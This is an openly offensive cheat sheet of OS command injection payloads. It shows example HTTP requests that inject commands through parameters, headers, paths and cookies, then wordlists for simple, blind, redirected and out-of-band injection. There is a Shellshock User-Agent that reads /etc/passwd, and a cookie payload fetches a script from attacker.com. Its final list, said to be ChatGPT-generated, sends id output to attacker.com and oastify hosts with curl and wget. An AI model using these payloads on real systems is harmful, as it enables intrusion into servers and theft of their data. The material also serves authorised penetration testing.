

# OS Command Injection Payloads

  - [Description](#description)
  - [Wordlist](#wordlist)
  - [Simple Case](#simple-case)
  - [Blind Injection](#blind-injection)
  - [Blind Injection with Output Redirection](#blind-injection-with-output-redirection)
  - [Out of Band](#out-of-band)
  - [ChatGPT Payload](#chatgpt-payload)
___
# Description

To exploit an OS command injection vulnerability, an attacker must find a place where the application accepts user input and then inject a malicious payload that executes arbitrary commands on the server. This usually involves crafting an HTTP request where the payload is placed in an input field that the server processes with a system command.

Here are some examples of where to put a command injection payload in HTTP requests:

### 1. In Query Parameters

When an application takes a query parameter as input and uses it in a command execution on the server, you can place the payload in the parameter value.

**Example HTTP Request:**
```
GET /ping?host=127.0.0.1;cat%20/etc/passwd HTTP/1.1
Host: vulnerable-website.com
```
In this case, the server might execute a command like `ping 127.0.0.1` based on the input. The payload (`;cat /etc/passwd`) tries to execute an additional command to read the contents of the `/etc/passwd` file.

### 2. In POST Data

If a web application processes POST data to execute commands, you can inject the payload directly into the form data.

**Example HTTP Request:**
```
POST /submit HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 32

username=admin&command=whoami;id
```
In this example, the `command` parameter contains a payload (`whoami;id`) that tries to execute `whoami` followed by `id`. If the server executes this input as part of a command, the payload can run.

### 3. In HTTP Headers

Attackers may inject command injection payloads into HTTP headers if the application processes header values and uses them in commands.

**Example HTTP Request:**
```
GET / HTTP/1.1
Host: vulnerable-website.com
User-Agent: curl; ls -la
```
If the server uses the `User-Agent` header in a command execution, the payload (`; ls -la`) may run on the server.

### 4. In URL Path

Command injection payloads can also be placed in the URL path if the web application uses parts of the path to execute commands.

**Example HTTP Request:**
```
GET /execute/ls%20-la;cat%20/etc/passwd HTTP/1.1
Host: vulnerable-website.com
```
Here, the URL path `/execute/ls -la;cat /etc/passwd` is designed to manipulate the command execution on the server.

### 5. In Cookie Header

If the web application reads cookies and uses them in a system command, the payload can be placed inside the cookie value.

**Example HTTP Request:**
```
GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=abc123; curl -o /tmp/malicious.sh http://attacker.com/malicious.sh
```
The payload attempts to download a malicious script if the server processes the cookie value in a system command.

### Crafting the Payload

Common payloads for command injection include using separators like `;`, `&&`, `|`, or `||` to chain commands. Examples:
- `; cat /etc/passwd`
- `&& whoami`
- `| ls -la`
- `|| echo vulnerable`

By injecting these payloads in the right places, attackers can exploit command injection vulnerabilities to execute arbitrary commands on the server. Proper input validation, sanitization, and secure coding practices are crucial to mitigate these risks.

## Wordlist
```sh
;whoami;
;sleep+10;
nslookup+burpcollaborator.net
|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1
```
## Simple Case
```sh
& echo test &

& whoami #

;ls

;ls;

User-Agent: () { :; }; echo ; /bin/bash -c "cat /etc/passwd" >> In User-Agent Header.
```
## Blind injection
Example:  name=test&email=```;sleep 5;```&message=test or, name=test&email=```||sleep 5||```&message=test
```sh
; sleep 10 ||

& sleep 10 #

; sleep 10 ;

asd||sleep 5|| >> Middle of two parameter.

||ping+-c+10+127.0.0.1||

& ping -c 10 127.0.0.1

asd||sleep 5 # >> Last parameter or to comment out extra parameter
```
## Blind injection with output redirection
If you identified a blind Command Injection try to find a writable folder to read your output. Suppose, if a application serves it's images for the product catalog from location like ```/image?filename=22.jpg```, you can redirect the output from the injected command to a file in this ```images``` folder, and then use this URL to retrieve the contents of the file.
```sql
& whoami > /var/www/images/output.txt #
; whoami > /var/www/images/output.txt ;
```
Now, you can read content like this ```/image?filename=output.txt```

## Out of band
```sh
||nslookup x.vyx05udastzq6llyo3y9vqiswj2aq3vrk.oastify.com||

& nslookup x.burpcollaborator.net #

& nslookup `whoami`.xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #

& nslookup $(whoami).xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #

|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1

Example-01: /api/v1/pdf/generate_zip?seed_id=521b62f5b7132de722027388|ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #' |ping -n 21 127.0.0.1||`ping -c 21 127.0.0.1` #\" |ping -n 21 127.0.0.1

Example-02: https://api.seedr.ru/uploads/521b62f5b7132de722027388|nslookup -q=cname 0vwm3493ytajvrc4a2g7ptfmgdm7a04o0crzhn6.burpcollaborator.net.&.zip

Example-03: email=a@a.com|nslookup -q=cname 6dkbk5sl74e1lw093edka1x3buhl5g34s.oastify.com.&.zip
```
## ChatGpt Generated Payload
```
; ls
; dir
| ls
| dir
&& ls
&& dir
|| ls
|| dir
`ls`
`dir`
$(ls)
$(dir)
; id
; whoami
| id
| whoami
&& id
&& whoami
|| id
|| whoami
`id`
`whoami`
$(id)
$(whoami)
; id > /tmp/output.txt
; whoami > /tmp/output.txt
| id > /tmp/output.txt
| whoami > /tmp/output.txt
&& id > /tmp/output.txt
&& whoami > /tmp/output.txt
|| id > /tmp/output.txt
|| whoami > /tmp/output.txt
`id` > /tmp/output.txt
`whoami` > /tmp/output.txt
$(id) > /tmp/output.txt
$(whoami) > /tmp/output.txt
; curl `whoami`.omesahu9nof8ql22r8i9a1cvum0do6cv.oastify.com
; curl http://attacker.com?data=$(id)
; wget http://attacker.com?data=$(id)
| curl http://attacker.com?data=$(id)
| wget http://attacker.com?data=$(id)
&& curl http://attacker.com?data=$(id)
&& wget http://attacker.com?data=$(id)
|| curl http://attacker.com?data=$(id)
|| wget http://attacker.com?data=$(id)
`curl http://attacker.com?data=$(id)`
`wget http://attacker.com?data=$(id)`
$(curl http://attacker.com?data=$(id))
$(wget http://attacker.com?data=$(id))
```
